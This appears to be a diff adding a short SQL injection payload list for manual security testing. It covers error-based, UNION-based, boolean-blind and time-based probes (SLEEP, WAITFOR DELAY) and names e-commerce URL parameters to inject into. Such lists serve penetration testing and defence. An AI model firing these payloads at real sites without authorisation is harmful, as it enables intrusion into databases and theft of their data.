@@ -1,0 +1,37 @@
+# SQL Injection Test Payloads for Manual Testing
+# Use in search, product IDs, category parameters, login fields
+# Look for: error messages, different responses, time delays
+
+# Error-based detection
+'
+"
+' OR '1'='1
+" OR "1"="1
+' OR '1'='1' --
+' OR '1'='1' #
+1' ORDER BY 1--
+1' ORDER BY 10--
+
+# Union-based detection
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+
+# Boolean-based blind
+' AND 1=1--
+' AND 1=2--
+1 AND 1=1
+1 AND 1=2
+
+# Time-based blind
+' AND SLEEP(5)--
+' OR SLEEP(5)--
+1; WAITFOR DELAY '0:0:5'--
+' AND (SELECT SLEEP(5))--
+
+# Common parameter targets for e-commerce
+# - Product IDs: /product/123 -> /product/123'
+# - Category filters: ?category=1 -> ?category=1'
+# - Sort parameters: ?sort=price -> ?sort=price'
+# - Search: ?q=test -> ?q=test'
+# - Pagination: ?page=1 -> ?page=1'
